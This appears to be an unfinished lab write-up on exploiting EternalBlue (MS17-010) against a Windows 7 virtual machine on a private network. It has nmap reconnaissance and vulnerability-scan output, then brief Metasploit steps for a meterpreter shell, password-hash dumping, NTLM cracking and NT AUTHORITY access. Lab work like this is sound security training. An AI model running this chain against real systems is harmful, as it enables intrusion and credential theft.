**EternalBlue Exploitation | MS17-010**

The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, aka "Windows SMB Remote Code Execution Vulnerability." This vulnerability is different from those described in CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, and CVE-2017-0148.

**Identifying target**

Target machine:
    windows cmd confirmation with ipconfig 192.168.64.131
    kali cli confirmation with sudo arp-scan -l presented 192.168.64.131

**Confirming the target machine on local network using arp-scan -l:**
    arp-scan -l

    root@kali:/home/kali# arp-scan -l
    Interface: eth0, type: EN10MB, MAC: 00:0c:29:e4:4b:56, IPv4: 192.168.64.129
    Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
    192.168.64.2    00:50:56:f7:bd:1d       VMware, Inc.
    192.168.64.1    00:50:56:c0:00:08       VMware, Inc.
    192.168.64.131  00:0c:29:9c:4b:83       VMware, Inc.
    192.168.64.254  00:50:56:e1:67:05       VMware, Inc.


**Test target connecitvity:**
ping 192.168.64.131. 29 packets transmitted 29 received, 0% packet loss.

**Target scanning using nmap:**
nmap -sC -sV -T4 --top-ports 1000 192.168.64.131 
      
      kali@kali:~$ nmap -sC -sV -T4 --top-ports 1000 192.168.64.131
      Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-26 08:42 EDT
      Nmap scan report for 192.168.64.131
      Host is up (0.00028s latency).
      Not shown: 992 closed ports
      PORT      STATE SERVICE      VERSION
      135/tcp   open  msrpc        Microsoft Windows RPC
      139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
      445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
      49152/tcp open  msrpc        Microsoft Windows RPC
      49153/tcp open  msrpc        Microsoft Windows RPC
      49154/tcp open  msrpc        Microsoft Windows RPC
      49155/tcp open  msrpc        Microsoft Windows RPC
      49156/tcp open  msrpc        Microsoft Windows RPC
      Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows
      
      Host script results:
      |_clock-skew: mean: 16h19m58s, deviation: 2h18m33s, median: 14h59m58s
      |_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:9c:4b:83 (VMware)
      | smb-os-discovery: 
      |   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
      |   OS CPE: cpe:/o:microsoft:windows_7::sp1
      |   Computer name: WIN-845Q99OO4PP
      |   NetBIOS computer name: WIN-845Q99OO4PP\x00
      |   Workgroup: WORKGROUP\x00
      |_  System time: 2024-09-26T23:43:24-04:00
      | smb-security-mode: 
      |   account_used: guest
      |   authentication_level: user
      |   challenge_response: supported
      |_  message_signing: disabled (dangerous, but default)
      | smb2-security-mode: 
      |   2.02: 
      |_    Message signing enabled but not required
      | smb2-time: 
      |   date: 2024-09-27T03:43:24
      |_  start_date: 2024-09-27T03:11:45
      
      Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
      Nmap done: 1 IP address (1 host up) scanned in 65.81 seconds

**Vulnerability scanning using nmap:**
nmap --script vuln --top-ports 1000 192.168.64.131 
  
      Host script results:
      |_smb-vuln-ms10-054: false
      |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
      | smb-vuln-ms17-010: 
      |   VULNERABLE:
      |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
      |     State: VULNERABLE
      |     IDs:  CVE:CVE-2017-0143
      |     Risk factor: HIGH
      |       A critical remote code execution vulnerability exists in Microsoft SMBv1
      |        servers (ms17-010).
      |           
      |     Disclosure date: 2017-03-14
      |     References:
      |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
      |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
      |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
      
      Nmap done: 1 IP address (1 host up) scanned in 126.35 seconds


##### TBC here onwards. #####

**Research all ports, along with the critical finding in scan number 2.**


**Exploits for Port 135/tcp (Microsoft Windows RPC)**
Port 135 is used by the RPC Endpoint Mapper. Historically, there have been vulnerabilities associated with RPC services, notably:

MS03-026 (CVE-2003-0352): A buffer overflow in the RPC DCOM interface allowing remote code execution.
MS03-039 (CVE-2003-0715): Similar to MS03-026 with additional fixes.

However, these vulnerabilities affect older Windows versions like Windows XP and Windows 2000. Windows 7 SP1 is not affected by these specific vulnerabilities, and they were patched long ago.


**Exploits for Port 139/tcp (NetBIOS Session Service)**
Port 139 is used for NetBIOS Session Service, which facilitates file and printer sharing over NetBIOS.

Historical Vulnerabilities:
Information Disclosure: Null session attacks could allow an attacker to enumerate users, shares, and other information.
SMB Relay Attacks: Exploiting SMB to relay authentication and gain unauthorized access.
However, these are typically not direct remote code execution vulnerabilities and often require additional conditions or misconfigurations.

look for auxiliary verison
check if target ip is vulnerable

use 3
set payload to win7/tcp/meterpreter version
rhost target ip
run

meterpreter shell access
sysinfo
hashdump

crack ntml password
conduct screenshot

gain nt authority access
